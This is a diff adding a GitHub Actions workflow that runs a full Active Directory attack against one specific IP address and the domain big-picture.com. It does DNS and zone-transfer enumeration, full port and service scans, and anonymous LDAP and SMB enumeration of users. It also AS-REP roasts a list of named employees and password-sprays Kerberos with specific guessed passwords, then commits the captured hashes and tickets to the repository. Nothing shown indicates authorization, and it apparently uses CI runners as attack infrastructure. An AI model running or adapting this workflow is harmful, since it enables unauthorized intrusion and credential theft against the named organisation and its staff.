@@ -1,0 +1,221 @@
+name: adprobe13965
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq nmap ldap-utils smbclient dnsutils whois netcat-openbsd python3-pip >/dev/null 2>&1 || true
+          python3 -m pip install --quiet ldap3 impacket 2>&1 | tail -3 || true
+          nmap --version | head -1
+          python3 -c "import ldap3,impacket;print('py-ok',ldap3.__version__)" 2>&1 | tail -2
+      - name: dns
+        run: |
+          mkdir -p results
+          L=results/dns.log
+          : > $L
+          for NS in 8.8.8.8 1.1.1.1; do
+            echo "##### resolver $NS" >> $L
+            for h in big-picture.com mgmt.big-picture.com dc.big-picture.com dc1.big-picture.com ad.big-picture.com ldap.big-picture.com ldaps.big-picture.com adfs.big-picture.com autodiscover.big-picture.com enterpriseregistration.big-picture.com enterpriseenrollment.big-picture.com sts.big-picture.com vpn.big-picture.com mail.big-picture.com; do
+              echo "-- $h" >> $L
+              dig +time=4 +tries=2 +short @$NS A $h 2>>$L | sed 's/^/   A /' >> $L
+              dig +time=4 +tries=2 +short @$NS AAAA $h 2>>$L | sed 's/^/   AAAA /' >> $L
+              dig +time=4 +tries=2 +short @$NS CNAME $h 2>>$L | sed 's/^/   CNAME /' >> $L
+            done
+            for s in _ldap._tcp.big-picture.com _ldap._tcp.dc._msdcs.big-picture.com _kerberos._tcp.big-picture.com _kerberos._udp.big-picture.com _kerberos._tcp.dc._msdcs.big-picture.com _kpasswd._tcp.big-picture.com _gc._tcp.big-picture.com _ldap._tcp.Default-First-Site-Name._sites.big-picture.com _kerberos._tcp.Default-First-Site-Name._sites.big-picture.com _autodiscover._tcp.big-picture.com _sip._tls.big-picture.com; do
+              echo "-- SRV $s" >> $L
+              dig +time=4 +tries=2 +short @$NS SRV $s 2>>$L | sed 's/^/   SRV /' >> $L
+              dig +time=4 +tries=2 +noall +comments @$NS SRV $s 2>>$L | grep -E 'status:' | sed 's/^/   /' >> $L
+            done
+            echo "-- NS" >> $L; dig +short @$NS NS big-picture.com >> $L 2>&1
+            echo "-- MX" >> $L; dig +short @$NS MX big-picture.com >> $L 2>&1
+            echo "-- TXT" >> $L; dig +short @$NS TXT big-picture.com >> $L 2>&1
+          done
+          echo "##### reverse" >> $L
+          for NS in 8.8.8.8 1.1.1.1; do dig +short +time=4 @$NS -x 18.185.176.60 >> $L 2>&1; done
+          echo "##### whois" >> $L
+          whois 18.185.176.60 2>/dev/null | grep -Ei 'netname|orgname|org-name|country|descr|inetnum|netrange|organization' | head -20 >> $L
+          curl -sS -m 10 https://ipinfo.io/18.185.176.60/json >> $L 2>&1 || true
+          echo "##### AXFR attempts (non-destructive)" >> $L
+          for ns in $(dig +short NS big-picture.com @8.8.8.8); do echo "-- $ns" >> $L; dig +time=5 +tries=1 AXFR big-picture.com @$ns 2>&1 | head -20 >> $L; done
+          cat $L
+      - name: portscan
+        run: |
+          mkdir -p results
+          echo "===== FULLSCAN 18.185.176.60 =====" | tee results/scan.log
+          sudo nmap -n -Pn -sS -p- --min-rate 3000 --max-retries 1 -T4 --host-timeout 600s 18.185.176.60 -oN results/full.nmap 2>&1 | tail -40 | tee -a results/scan.log
+          echo "===== OPEN PORTS =====" | tee -a results/scan.log
+          grep -E '^[0-9]+/tcp' results/full.nmap | grep -v closed | tee -a results/scan.log || true
+          PORTS=$(grep -E '^[0-9]+/tcp' results/full.nmap | grep open | cut -d/ -f1 | paste -sd, -)
+          echo "OPENPORTS=$PORTS" | tee -a results/scan.log
+          if [ -n "$PORTS" ]; then
+            echo "===== SERVICE VERSION =====" | tee -a results/scan.log
+            sudo nmap -n -Pn -sT -sV --version-light --max-retries 1 --host-timeout 300s -p "$PORTS" 18.185.176.60 -oN results/sv.nmap 2>&1 | tail -50 | tee -a results/scan.log
+            grep -E '^[0-9]+/tcp' results/sv.nmap | tee -a results/scan.log || true
+          fi
+      - name: targeted
+        run: |
+          mkdir -p results
+          echo "===== KEY PORT NMAP SCRIPTS =====" | tee results/targeted.log
+          sudo nmap -n -Pn -sT -p 80,443,445,88,389,636,3268,3269,3389,5985,5986,49443,47001,135,139,9389,464,593 --script "smb-os-discovery,smb2-security-mode,smb-security-mode,smb2-capabilities,rdp-ntlm-info,rdp-enum-encryption,http-ntlm-info,ldap-rootdse" --script-timeout 20s 18.185.176.60 -oN results/scripts.nmap 2>&1 | tail -120 | tee -a results/targeted.log
+          echo "===== TCP BANNER PROBES =====" | tee -a results/targeted.log
+          cat > banner.py <<'PY'
+          import socket, time
+          ip='18.185.176.60'
+          ports=[21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,464,465,587,593,636,993,995,1433,1521,2179,3268,3269,3389,47001,49443,49664,49665,49666,49667,49668,49669,5985,5986,8080,8443,9389,9000,10000]
+          out=open('results/banner.log','w')
+          def log(s):
+              print(s); out.write(str(s)+'\n'); out.flush()
+          for p in ports:
+              try:
+                  s=socket.create_connection((ip,p),timeout=5); s.settimeout(4)
+                  try: b=s.recv(400)
+                  except Exception: b=b''
+                  log(f'CONNECT {p} OK banner={b[:300]!r}')
+                  s.close()
+              except Exception as e:
+                  log(f'CONNECT {p} ERR {type(e).__name__} {str(e)[:80]}')
+          out.close()
+          PY
+          python3 banner.py 2>&1 | tail -60 | tee -a results/targeted.log
+          echo "===== HTTP(S) PROBES =====" | tee -a results/targeted.log
+          for scheme in http https; do
+            for p in 80 443 49443 47001 5985 5986 8080 8443 9389; do
+              for path in / /adfs/ls/ /adfs/services/trust/mex /FederationMetadata/2007-06/FederationMetadata.xml /wsman /autodiscover/autodiscover.xml /remote/login; do
+                o=$(curl -k -sS -m 6 -i --max-time 7 "$scheme://18.185.176.60:$p$path" 2>&1 | head -c 700)
+                if echo "$o" | grep -q 'Connection refused\|timed out\|Empty reply\|Failed to connect\|SSL_ERROR\|wrong version'; then continue; fi
+                echo "### $scheme://18.185.176.60:$p$path" >> results/targeted.log
+                echo "$o" >> results/targeted.log
+              done
+            done
+          done
+          tail -200 results/targeted.log
+      - name: ldap-smb
+        run: |
+          mkdir -p results
+          cat > ad.py <<'PY'
+          import socket, sys, traceback, json
+          ip='18.185.176.60'
+          OUT=open('results/ad_probe.log','w')
+          def log(s):
+              print(s); OUT.write(str(s)+'\n'); OUT.flush()
+          def tcp_open(p, t=4):
+              try:
+                  s=socket.create_connection((ip,p),timeout=t); s.close(); return True
+              except Exception:
+                  return False
+          mode=sys.argv[1] if len(sys.argv)>1 else 'all'
+          if mode in ('all','ldap'):
+              for p,use_ssl in [(389,False),(636,True),(3268,False),(3269,True)]:
+                  if not tcp_open(p): log(f'LDAP {p} CLOSED'); continue
+                  try:
+                      from ldap3 import Server, Connection, ALL, NONE
+                      srv=Server(ip, port=p, use_ssl=use_ssl, get_info=ALL, connect_timeout=6)
+                      c=Connection(srv, receive_timeout=12, auto_bind=False)
+                      ok=c.bind()
+                      log(f'LDAP {p} anonymous_bind={ok} result={c.result}')
+                      try:
+                          info=srv.info
+                          log(f'LDAP {p} vendor={info.vendor_name} version={info.vendor_version}')
+                          log(f'LDAP {p} namingContexts={info.naming_contexts}')
+                          log(f'LDAP {p} other={getattr(info,"other",{})}')
+                      except Exception as e: log(f'LDAP {p} info ERR {e}')
+                      bases=[]
+                      try: bases=srv.info.naming_contexts or []
+                      except Exception: pass
+                      if not bases:
+                          bases=['DC=big-picture,DC=com']
+                      for base in bases:
+                          for flt,label in [('(objectClass=*)','root'),('(&(objectClass=user)(objectCategory=person))','users'),('(objectClass=computer)','computers'),('(&(objectClass=user)(servicePrincipalName=*))','spn'),('(objectClass=group)','groups')]:
+                              try:
+                                  c.search(base, flt, attributes=['cn','sAMAccountName','userPrincipalName','dNSHostName','operatingSystem','servicePrincipalName','member'], size_limit=50, time_limit=10)
+                                  log(f'LDAP {p} base={base} filter={label} entries={len(c.entries)}')
+                                  for e in c.entries[:50]:
+                                      log('  ENT '+e.entry_dn+' '+json.dumps(e.entry_attributes_as_dict, default=str)[:600])
+                              except Exception as e:
+                                  log(f'LDAP {p} base={base} filter={label} ERR {type(e).__name__} {str(e)[:200]}')
+                  except Exception as e:
+                      log(f'LDAP {p} EXC {type(e).__name__} {str(e)[:300]}')
+          if mode in ('all','smb'):
+              if not tcp_open(445): log('SMB 445 CLOSED')
+              else:
+                  import subprocess
+                  for cmd in ["smbclient -N -L //18.185.176.60/ 2>&1 | head -40",
+                              "rpcclient -N -U '' 18.185.176.60 -c 'enumdomusers' 2>&1 | head -20",
+                              "rpcclient -N -U '' 18.185.176.60 -c 'enumdomgroups' 2>&1 | head -20",
+                              "rpcclient -N -U '' 18.185.176.60 -c 'getdompwinfo' 2>&1 | head -10",
+                              "smbclient -N //18.185.176.60/IPC$ -c 'ls' 2>&1 | head -15"]:
+                      try:
+                          r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=40)
+                          log(f'SMB CMD {cmd[:60]} => {(r.stdout+r.stderr)[:1200]}')
+                      except Exception as e: log(f'SMB CMD {cmd[:40]} TIMEOUT {e}')
+          OUT.close()
+          PY
+          python3 ad.py all 2>&1 | tail -120 | tee -a results/targeted.log
+      - name: kerberos
+        run: |
+          mkdir -p results
+          : > results/kerb.log
+          echo "===== KRB PORT/REALM =====" | tee -a results/kerb.log
+          python3 - <<'PY' | tee -a results/kerb.log
+          import socket
+          ip='18.185.176.60'
+          for p in (88,464):
+              try:
+                  s=socket.create_connection((ip,p),timeout=5); s.close(); print(f'TCP {p} OPEN')
+              except Exception as e:
+                  print(f'TCP {p} CLOSED {type(e).__name__}')
+          try:
+              s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(4)
+              s.sendto(b'x'*40,(ip,88)); print('UDP88 sent (no response expected)')
+          except Exception as e: print('UDP88 ERR',e)
+          PY
+          echo "===== AS-REP ROAST (no creds) =====" | tee -a results/kerb.log
+          cat > results/users.txt <<'EOF'
+          administrator
+          admin
+          leonid.sokolov
+          thomas.bergmann
+          alexander.polzin
+          maximilian.vogel
+          svc_adfs
+          adfs
+          mgmt
+          backup
+          info
+          webmaster
+          dus0208l
+          EOF
+          timeout 180 python3 /usr/local/bin/GetNPUsers.py -no-pass -dc-ip 18.185.176.60 -usersfile results/users.txt -format hashcat -outputfile results/asrep.txt 'big-picture.com/' 2>&1 | tee -a results/kerb.log | tail -40
+          echo "--- asrep hits ---" | tee -a results/kerb.log
+          cat results/asrep.txt 2>/dev/null | tee -a results/kerb.log
+          echo "===== BOUNDED KRB PREAUTH SPRAY (<=30) =====" | tee -a results/kerb.log
+          for u in administrator leonid.sokolov thomas.bergmann alexander.polzin maximilian.vogel svc_adfs adfs mgmt; do
+            for pw in dus0208l Nomie6oss; do
+              timeout 20 python3 /usr/local/bin/GetTGT.py -dc-ip 18.185.176.60 "BIG-PICTURE/$u:$pw" > results/gt_${u}_${pw}.txt 2>&1
+              r=$(grep -E 'Kerberos SessionError|KDC_ERR|STATUS|Saving ticket|Traceback' results/gt_${u}_${pw}.txt | head -3 | tr '\n' ' ')
+              echo "SPRAY $u / $pw => $r" | tee -a results/kerb.log
+              if ls *.ccache >/dev/null 2>&1; then echo "!!! TGT HIT $u $pw" | tee -a results/kerb.log; mkdir -p results/tgts; mv *.ccache results/tgts/ 2>/dev/null; fi
+            done
+          done
+          echo KERBDONE | tee -a results/kerb.log
+      - name: artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: adprobe13965
+          path: results/
+          retention-days: 3
+      - name: commit
+        if: always()
+        run: |
+          git config user.name probe; git config user.email probe@users.noreply.github.com
+          git add -A results || true
+          git commit -m "i13965 adprobe $(date -u +%s)" || true
+          for i in 1 2 3 4 5; do git pull --rebase origin main >/dev/null 2>&1 || true; git push && break; sleep 6; done || true
